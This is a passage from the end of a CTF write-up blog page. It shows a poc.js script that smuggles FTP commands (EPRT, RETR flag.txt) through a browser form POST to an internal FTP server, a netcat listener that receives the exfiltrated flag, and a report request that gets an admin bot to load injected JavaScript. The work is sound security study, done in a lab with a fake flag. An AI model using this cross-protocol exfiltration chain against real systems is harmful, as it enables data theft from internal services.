+Host this <code>poc.js</code> file</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=c1>// poc.js
+</span></span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>xhr</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>XMLHttpRequest</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>url</span> <span class=o>=</span> <span class=s1>&#39;http://172.21.0.2:2121&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1>// const url = &#39;http://127.0.0.1:2121&#39;;
+</span></span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>content</span> <span class=o>=</span> <span class=s2>&#34;USER anonymous\r\nPASS \r\nEPRT |1|172.21.0.1|7777|\r\nRETR flag.txt\r\n\r\n&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>formData</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>FormData</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nx>formData</span><span class=p>.</span><span class=nx>append</span><span class=p>(</span><span class=s2>&#34;file&#34;</span><span class=p>,</span> <span class=nx>content</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>xhr</span><span class=p>.</span><span class=nx>open</span><span class=p>(</span><span class=s2>&#34;POST&#34;</span><span class=p>,</span> <span class=nx>url</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>xhr</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=nx>formData</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>Open a netcat listener</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>nc -lvnp <span class=m>7777</span>
+</span></span></code></pre></td></tr></table></div></div><p>Send the confessions post that can load arbitrary JavaScript file to admin</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api/report</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=g>Host: localhost:1337
+</span></span></span><span class=line><span class=cl><span class=g>
+</span></span></span><span class=line><span class=cl><span class=g>url=http%3a//web%3a3000/confession/357czf11d-14ea-4777-8d6b-20af42e1f377
+</span></span></span></code></pre></td></tr></table></div></div><p>Output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>connect to [172.21.0.1] from (UNKNOWN) [172.21.0.2] 39105
+</span></span><span class=line><span class=cl>RE:CTF{fakeflag}
+</span></span></code></pre></td></tr></table></div></div><ul><li>It works because all of them is in the same LAN.</li></ul><ol start=10><li>I wonder how it will work if I only have a domain and no static IP. Can I get the flag from FTP active mode?</li></ol><h2 id=references>References</h2><ol><li>Special thanks to the challenge creator for sharing this challenge and solution.</li><li>References:<ol><li><a class=link href=https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/ target=_blank rel=noopener>https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/</a></li><li><a class=link href=https://ctftime.org/writeup/29641 target=_blank rel=noopener>https://ctftime.org/writeup/29641</a></li><li><a class=link href=https://slacksite.com/other/ftp.html#actexample target=_blank rel=noopener>https://slacksite.com/other/ftp.html#actexample</a></li><li><a class=link href=https://chromium-review.googlesource.com/c/chromium/src/+/6378605 target=_blank rel=noopener>https://chromium-review.googlesource.com/c/chromium/src/+/6378605</a></li></ol></li></ol></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>Ctf</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/reunionctf-2026-writeups/><div class=article-details><h2 class=article-title>ReunionCTF 2026 Writeups</h2></div></a></article><article><a href=/p/curtin-ctf-2025-selected-writeups/><div class=article-details><h2 class=article-title>Curtin CTF 2025 Selected Writeups</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2025 -
+2026 Froginacup's site</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
